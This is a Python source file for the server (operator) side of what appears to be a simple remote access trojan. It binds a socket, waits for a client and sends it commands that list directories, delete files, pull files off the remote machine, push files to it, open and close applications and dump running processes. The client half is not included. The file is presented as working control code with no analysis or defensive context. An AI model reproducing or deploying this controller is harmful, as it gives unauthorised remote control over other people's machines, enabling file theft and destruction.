#####################this is SERVER

import os
import socket
s= socket.socket ()
host='127.0.0.1'
port=8080
s.bind((host,port))
print("")
print(" Server is currently running ", host)
print ("")
print(" Waiting for any incoming connections...")
s.listen (1)
conn, addr = s.accept ()
print ("")
print (addr, " Has connected to the server successfully ")
print("")
print("1:view_cwd")
print("2:active_dir")
print("3:delete_file")
print("4:send_file")
print("5:download_file")
print("6:open")
print("7:close")
print("8:stop")
print("9:custom_dir")
print("0:prcss")
print("")
while 1:
    print ("")
    scmd  = input (str("Command >> ") )

    if scmd == "commands":
        print("")
        print("1:view_cwd")
        print("2:active_dir")
        print("3:delete_file")
        print("4:send_file")
        print("5:download_file")
        print("6:open application")
        print("7:close application")
        print("8:stop_connection")
        print("9:custom_dir")
        print("0:prcss")
        print("")
    
    elif scmd == "view_cwd" or scmd == "1":
        command = "view_cwd"
        conn. send (command. encode ())
        print ("")
        print ("Command sent waiting for execution ... ")
        print ("")
        files =  conn.recv (5000)
        print("executed")
        files = files.decode()
        print("Command output:",files)
        

    elif scmd == "custom_dir" or scmd == "9":
        try:
           command = "custom_dir"
           conn.send (command.encode ())
           print ("")
           user_input =  input(str ("Custom Dir:"))
           conn.send (user_input.encode())
           print ("")
           print ("Command has been sent")
           print ("")
           files = conn.recv (5000)
           files = files.decode()
           print("output:",files)
        except Exception as e:
            print("No such directory")

    elif scmd == "download_file" or scmd == "5":
        try:
            command = "download_file"
            conn.send(command.encode())
            print("")
            filepath = input(str("enter file path and file name"))
            conn.send(filepath.encode())
            file = conn.recv(100000)
            print("")
            filename = input(str("enter file name of receiving file "))
            new_file = open(filename, "wb")
            new_file.write(file)
            new_file.close()
            print("")
            print(filename, "has been downloaded and saved")
            print("")
        except Exception as e:
            print("No such file inside the directory")

    elif scmd == "active_dir" or scmd == "2":
        command = "active_dir"
        conn.send(command.encode())
        print("")
        print("")
        print("command has been sent over.......waiting for execution")
        print("")
        files =  conn.recv (5000)
        print("executed")
        files = files.decode()
        print("Command output",files)

    elif scmd == "delete_file" or scmd == "3":
        try:
            command = "delete_file"
            conn.send(command.encode())
            print("")
            deluser_input = input("enter the file name nd extension:")
            conn.send(deluser_input.encode())
            print("")
            print("command has been sent over........waiting for execution")
            print("")
            print("executed")
        except Exception as e:
            print("No such file inside the  directory")

    elif scmd == "send_file" or scmd == "4":
        try:
         command = "send_file"
         conn.send(command.encode())
         file = input(str("please enter the file directory"))
         filename = input(str("please enter the filename"))
         data = open(file, "rb")
         file_data = data.read(7000)
         conn.send(filename.encode())
         print(file," has been sent")
         conn.send(file_data)
        except Exception as e:
            print(e)
            stopwrt_cmd = "stopwrt"
            conn.send(stopwrt_cmd.encode())

    elif scmd == "open" or scmd == "6":
        try:
            command = "open"
            conn.send(command.encode())
            print ("")
            openexe = input(str("please enter the file directory:"))
            conn.send(openexe.encode())
            print ("Command sent waiting for execution ... ")
            print ("")
            print("maybe executed")
        except Exception as e:
            print("No such file inside the  directory")
    elif scmd == "close" or scmd == "7":
        try:
            command = "close"
            conn.send(command.encode())
            print("")
            closeexe = input(str("please type application name with .exe:"))
            conn.send(closeexe.encode())
            print ("Command sent waiting for execution ... ")
            print ("")
            print("maybe executed")
        except Exception as e:
            print("Error")
            
    elif scmd == "stop" or scmd == "8":
        command = "stop"
        conn.send(command.encode())
        print("")
        print("executed")
        
    elif scmd =="prcss" or scmd == "0":
        command = "prcss"
        conn.send(command.encode())
        print("executed")
        apps =  conn.recv (5000)
        apps.decode()
        appsfinal = apps
        filename = "backgroundPrcss.txt"
        new_file = open(filename, "wb")
        new_file.write(appsfinal + b' ')
        new_file.close()
        print("")
        print(filename, "has been downloaded and saved")
        print("")
        
    else:
        print("Couldn't recognize command")
        print("")
        print("try commands")

                   
                    

